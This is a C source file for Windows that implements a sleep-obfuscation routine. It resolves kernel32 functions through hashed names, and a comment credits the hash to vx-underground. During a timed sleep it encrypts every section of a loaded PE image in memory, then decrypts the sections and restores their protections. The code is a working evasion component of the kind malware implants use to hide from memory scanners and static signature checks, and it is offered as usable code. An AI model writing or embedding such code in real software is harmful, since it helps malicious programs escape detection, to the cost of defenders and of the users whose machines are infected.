#include <windows.h>
#include "pehelper.h"
#include "hash.h"
#include "win.h"
#include "crypt.h"

__declspec(code_seg(".text$A"))
int EntryPoint(BYTE* buffer,DWORD millseconds)
{

	if (!buffer)
		return 0;

	DWORD dw_Protection[256];
	BOOL cryptRet = FALSE;
	WIN32_MODULE	wModule = { 0 };
	WIN32_FUNCTION	wFunction = { 0 };

	BYTE b_Sleep[] = { 'S', 'l', 'e', 'e', 'p', 0 };
	BYTE b_VirtualProtect[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'P', 'r', 'o','t','e','c','t',0};

	// hash算法来自 vx_underground的 https://github.com/vxunderground/VX-API/blob/69e5232de6474a7e698619fe7760dc0e3c292258/VX-API/HashStringMurmur.cpp#L3，存在区分大小写问题
	wModule.KERNEL32 = fnGetModuleAddr(1822664912); //  KERNEL32.DLL

	if(wModule.KERNEL32 == NULL)
		wModule.KERNEL32 = fnGetModuleAddr(3218858835); // kernel32.dll

	if (wModule.KERNEL32 != NULL)
	{
		wFunction.fnVirtualProtect = fnGetProcAddr(wModule.KERNEL32, -1101033013);
		wFunction.fnSleep = fnGetProcAddr(wModule.KERNEL32, -1290263746);

		if (wFunction.fnVirtualProtect && wFunction.fnSleep)
		{
			for (int i = 0; i < get_sections_count(buffer); i++)
			{
				IMAGE_SECTION_HEADER* sechdr = get_section_hdr(buffer, i);
				DWORD oldPage = translate_protect(sechdr->Characteristics);

				dw_Protection[i] = oldPage;

				if (sechdr->PointerToRawData == 0 || sechdr->SizeOfRawData == 0)
					continue;

				cryptRet = Encrypt(wFunction.fnVirtualProtect, sechdr->VirtualAddress + buffer, RoundUp(sechdr->Misc.VirtualSize,0x1000));

				if (!cryptRet)
					dw_Protection[i] = 0;
			}

			wFunction.fnSleep(millseconds);

			for (int i = 0; i < get_sections_count(buffer); i++)
			{
				IMAGE_SECTION_HEADER* sechdr = get_section_hdr(buffer, i);

				if (sechdr->PointerToRawData == 0 || sechdr->SizeOfRawData == 0)
					continue;

				if (dw_Protection[i] != 0)
				{
					Decrypt(wFunction.fnVirtualProtect, sechdr->VirtualAddress + buffer, RoundUp(sechdr->Misc.VirtualSize, 0x1000), dw_Protection[i]);
				}

			}

		}

	}

	return EXIT_SUCCESS;
}


